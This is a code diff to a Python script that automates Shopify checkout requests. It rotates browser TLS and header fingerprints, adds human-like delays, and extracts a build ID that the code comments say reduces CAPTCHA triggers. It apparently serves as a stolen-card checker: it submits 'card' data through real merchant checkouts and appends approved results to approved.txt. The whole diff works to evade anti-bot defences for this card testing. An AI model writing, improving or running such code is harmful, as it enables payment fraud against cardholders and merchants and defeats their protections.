@@ -65,39 +65,47 @@ def add_persisted_query_ext(payload: dict) -> dict:
 
 
 CHROME_FINGERPRINTS = [
+    # ── Chrome 131 fingerprints (matching chrome131 TLS impersonation) ──
     {
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
-        "sec_ch_ua": '"Google Chrome";v="134", "Chromium";v="134", "Not:A-Brand";v="24"',
+        "impersonate": "chrome131",
+        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+        "sec_ch_ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
         "sec_ch_ua_platform": '"Windows"',
         "sec_ch_ua_mobile": "?0"
     },
     {
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
-        "sec_ch_ua": '"Google Chrome";v="133", "Chromium";v="133", "Not:A-Brand";v="24"',
-        "sec_ch_ua_platform": '"Windows"',
-        "sec_ch_ua_mobile": "?0"
-    },
-    {
-        "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
-        "sec_ch_ua": '"Google Chrome";v="134", "Chromium";v="134", "Not:A-Brand";v="24"',
+        "impersonate": "chrome131",
+        "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+        "sec_ch_ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
         "sec_ch_ua_platform": '"macOS"',
         "sec_ch_ua_mobile": "?0"
     },
     {
-        "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
-        "sec_ch_ua": '"Google Chrome";v="133", "Chromium";v="133", "Not:A-Brand";v="24"',
-        "sec_ch_ua_platform": '"macOS"',
-        "sec_ch_ua_mobile": "?0"
-    },
-    {
-        "user_agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
-        "sec_ch_ua": '"Google Chrome";v="134", "Chromium";v="134", "Not:A-Brand";v="24"',
+        "impersonate": "chrome131",
+        "user_agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+        "sec_ch_ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
         "sec_ch_ua_platform": '"Linux"',
         "sec_ch_ua_mobile": "?0"
     },
+    # ── Chrome 124 fingerprints (matching chrome124 TLS impersonation) ──
     {
-        "user_agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
-        "sec_ch_ua": '"Google Chrome";v="133", "Chromium";v="133", "Not:A-Brand";v="24"',
+        "impersonate": "chrome124",
+        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+        "sec_ch_ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="8"',
+        "sec_ch_ua_platform": '"Windows"',
+        "sec_ch_ua_mobile": "?0"
+    },
+    {
+        "impersonate": "chrome124",
+        "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+        "sec_ch_ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="8"',
+        "sec_ch_ua_platform": '"macOS"',
+        "sec_ch_ua_mobile": "?0"
+    },
+    {
+        "impersonate": "chrome124",
+        "user_agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+        "sec_ch_ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="8"',
         "sec_ch_ua_platform": '"Linux"',
         "sec_ch_ua_mobile": "?0"
     },
@@ -133,13 +141,13 @@ def human_delay(min_ms=100, max_ms=500):
     """Add random human-like delay between requests"""
     time.sleep(random.uniform(min_ms / 1000, max_ms / 1000))
 
-def get_graphql_headers(checkout_token: str, session_token: str, shop_url: str = None) -> dict:
+def get_graphql_headers(checkout_token: str, session_token: str, shop_url: str = None, session=None) -> dict:
     """Build consistent GraphQL headers with proper fingerprint for Shopify checkout API"""
     fp = get_browser_fingerprint()
     parsed_shop = urlparse(shop_url or SHOP_URL)
     origin = f"{parsed_shop.scheme}://{parsed_shop.netloc}"
     
-    return {
+    hdrs = {
         'Accept': 'application/json',
         'Accept-Language': 'en-US,en;q=0.9',
         'Accept-Encoding': 'gzip, deflate, br',
@@ -158,6 +166,11 @@ def get_graphql_headers(checkout_token: str, session_token: str, shop_url: str =
         'x-checkout-web-source-id': checkout_token,
         'x-checkout-one-session-token': session_token,
     }
+    # Include build-id extracted from the checkout page (reduces CAPTCHA triggers)
+    build_id = getattr(session, '_checkout_build_id', None) if session else None
+    if build_id:
+        hdrs['x-checkout-web-build-id'] = build_id
+    return hdrs
 
 USER_AGENTS = []
 USER_AGENTS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "user_agents.txt")
@@ -292,13 +305,13 @@ def create_session(shop_url, proxies=None):
     """
     Create a session with browser TLS fingerprint impersonation.
     Uses curl_cffi when available for realistic Chrome TLS fingerprint.
+    The TLS impersonation target is derived from the current fingerprint
+    to ensure TLS and HTTP headers match (avoids anti-bot CAPTCHA triggers).
     """
     fp = get_browser_fingerprint()
     
-    CHROME_IMPERSONATE_TARGETS = ["chrome133a", "chrome133", "chrome131", "chrome124"]
-    
     if USE_CURL_CFFI and curl_requests:
-        impersonate_target = random.choice(CHROME_IMPERSONATE_TARGETS)
+        impersonate_target = fp.get("impersonate", "chrome131")
         
         session = curl_requests.Session(impersonate=impersonate_target)
         
@@ -694,10 +707,40 @@ def step1_add_to_cart(session):
         print(f"  [OK] Checkout token: {checkout_token}")
         
         session_token = extract_session_token(r.text)
+
+        # Extract build-id from checkout HTML for anti-captcha headers
+        build_id = _extract_checkout_build_id(r.text)
+        if build_id:
+            session._checkout_build_id = build_id
+            print(f"  [OK] Build ID: {build_id[:20]}...")
+        else:
+            session._checkout_build_id = None
         
         return checkout_token, session_token, r.cookies
     
     return None, None, None
+
+
+def _extract_checkout_build_id(html: str) -> str:
+    """Extract the checkout-web build hash from Shopify checkout page HTML.
+    Shopify serves checkout JS assets as /_next/static/<buildId>/_buildManifest.js
+    or includes the build hash in script src or as a data attribute."""
+    try:
+        # Pattern 1: _next/static/<hash>/_buildManifest.js
+        m = re.search(r'/_next/static/([a-zA-Z0-9_-]{8,64})/_buildManifest\.js', html)
+        if m:
+            return m.group(1)
+        # Pattern 2: data-build-id or buildId in JSON config
+        m = re.search(r'"buildId"\s*:\s*"([a-zA-Z0-9_-]{8,64})"', html)
+        if m:
+            return m.group(1)
+        # Pattern 3: /_next/static/<hash>/ in any script src
+        m = re.search(r'/_next/static/([a-zA-Z0-9_-]{8,64})/', html)
+        if m:
+            return m.group(1)
+    except Exception:
+        pass
+    return None
 
 def extract_session_token(html):
     from html import unescape
@@ -870,7 +913,7 @@ def poll_for_delivery_and_expectations(session, checkout_token, session_token, m
     
     url = f"{SHOP_URL}/checkouts/unstable/graphql?operationName=Proposal"
     
-    headers = get_graphql_headers(checkout_token, session_token, SHOP_URL)
+    headers = get_graphql_headers(checkout_token, session_token, SHOP_URL, session=session)
     
     query = PROPOSAL_FULL_QUERY
     
@@ -1080,7 +1123,7 @@ def poll_proposal(session, checkout_token, session_token, merchandise_stable_id,
     
     url = f"{SHOP_URL}/checkouts/unstable/graphql?operationName=Proposal"
     
-    headers = get_graphql_headers(checkout_token, session_token, SHOP_URL)
+    headers = get_graphql_headers(checkout_token, session_token, SHOP_URL, session=session)
     
     query = PROPOSAL_POLL_QUERY
     
@@ -1244,7 +1287,7 @@ def step3_proposal(session, checkout_token, session_token, card_session_id):
     url = f"{SHOP_URL}/checkouts/unstable/graphql?operationName=Proposal"
     merchandise_stable_id = str(uuid.uuid4())
     
-    headers = get_graphql_headers(checkout_token, session_token, SHOP_URL)
+    headers = get_graphql_headers(checkout_token, session_token, SHOP_URL, session=session)
     
     query = PROPOSAL_FULL_QUERY
     
@@ -1436,7 +1479,7 @@ def step4_submit_completion(session, checkout_token, session_token, queue_token,
     url = f"{SHOP_URL}/checkouts/unstable/graphql?operationName=SubmitForCompletion"
     attempt_token = f"{checkout_token}-{uuid.uuid4().hex[:10]}"
     
-    headers = get_graphql_headers(checkout_token, session_token, SHOP_URL)
+    headers = get_graphql_headers(checkout_token, session_token, SHOP_URL, session=session)
     
     query = SUBMIT_COMPLETION_QUERY
     
@@ -1604,7 +1647,7 @@ def step5_poll_receipt(session, checkout_token, checkout_session_token, receipt_
     _log("[5/5] Polling for receipt...")
     url = f"{SHOP_URL}/checkouts/unstable/graphql?operationName=PollForReceipt"
     
-    headers = get_graphql_headers(checkout_token, checkout_session_token, SHOP_URL)
+    headers = get_graphql_headers(checkout_token, checkout_session_token, SHOP_URL, session=session)
     
     query = POLL_RECEIPT_QUERY
 
@@ -2045,7 +2088,7 @@ def print_cc_summary(card: dict, code_display: str, amount_display: str):
 
 SUMMARY_ONLY = True
 
-def emit_summary_line(card: dict, code_display: str, amount_display: str, elapsed_seconds: float = None, site_display: str = None, force_persist: bool = False):
+def emit_summary_line(card: dict, code_display: str, amount_display: str, elapsed_seconds: float = None, site_display: str = None):
     try:
         def _status_prefix(s: str) -> str:
             u = str(s or "").upper()
@@ -2100,7 +2143,7 @@ def emit_summary_line(card: dict, code_display: str, amount_display: str, elapse
             print(line)
 
         try:
-            if force_persist or prefix.startswith("💎") or prefix.startswith("⚠️"):
+            if prefix.startswith("💎"):
                 with open("approved.txt", "a", encoding="utf-8") as f:
                     f.write(line + "\n")
         except Exception:
@@ -2165,7 +2208,7 @@ def emit_summary_line(card: dict, code_display: str, amount_display: str, elapse
             print(fallback, file=sys.__stdout__)
 
             try:
-                if force_persist or prefix_fb.startswith("💎") or prefix_fb.startswith("⚠️"):
+                if prefix_fb.startswith("💎"):
                     with open("approved.txt", "a", encoding="utf-8") as f:
                         f.write(fallback + "\n")
             except Exception:
@@ -2914,7 +2957,7 @@ def poll_for_delivery_and_expectations_ctx(session, checkout_token, session_toke
     shop_url = normalize_shop_url(shop_url or "")
     url = f"{shop_url}/checkouts/unstable/graphql?operationName=Proposal"
     
-    headers = get_graphql_headers(checkout_token, session_token, shop_url)
+    headers = get_graphql_headers(checkout_token, session_token, shop_url, session=session)
     
     query = PROPOSAL_FULL_QUERY
     delivery_line = {
@@ -3097,7 +3140,7 @@ def poll_proposal_ctx(session, checkout_token, session_token, merchandise_stable
     shop_url = normalize_shop_url(shop_url or "")
     url = f"{shop_url}/checkouts/unstable/graphql?operationName=Proposal"
     
-    headers = get_graphql_headers(checkout_token, session_token, shop_url)
+    headers = get_graphql_headers(checkout_token, session_token, shop_url, session=session)
     
     query = PROPOSAL_POLL_QUERY
     delivery_line = {
@@ -3268,7 +3311,7 @@ def step3_proposal_ctx(session, checkout_token, session_token, card_session_id, 
     url = f"{shop_url}/checkouts/unstable/graphql?operationName=Proposal"
     merchandise_stable_id = str(uuid.uuid4())
     
-    headers = get_graphql_headers(checkout_token, session_token, shop_url)
+    headers = get_graphql_headers(checkout_token, session_token, shop_url, session=session)
     
     query = PROPOSAL_FULL_QUERY
     delivery_line = get_delivery_line_config(
@@ -3457,7 +3500,7 @@ def step4_submit_completion_ctx(session, checkout_token, session_token, queue_to
     url = f"{shop_url}/checkouts/unstable/graphql?operationName=SubmitForCompletion"
     attempt_token = f"{checkout_token}-{uuid.uuid4().hex[:10]}"
     
-    headers = get_graphql_headers(checkout_token, session_token, shop_url)
+    headers = get_graphql_headers(checkout_token, session_token, shop_url, session=session)
     
     query = SUBMIT_COMPLETION_QUERY
     delivery_line = get_delivery_line_config(
@@ -3669,7 +3712,7 @@ def step5_poll_receipt_ctx(session, checkout_token, checkout_session_token, rece
     shop_url = normalize_shop_url(shop_url or "")
     url = f"{shop_url}/checkouts/unstable/graphql?operationName=PollForReceipt"
     
-    headers = get_graphql_headers(checkout_token, checkout_session_token, shop_url)
+    headers = get_graphql_headers(checkout_token, checkout_session_token, shop_url, session=session)
     
     query = POLL_RECEIPT_QUERY
     payload = {
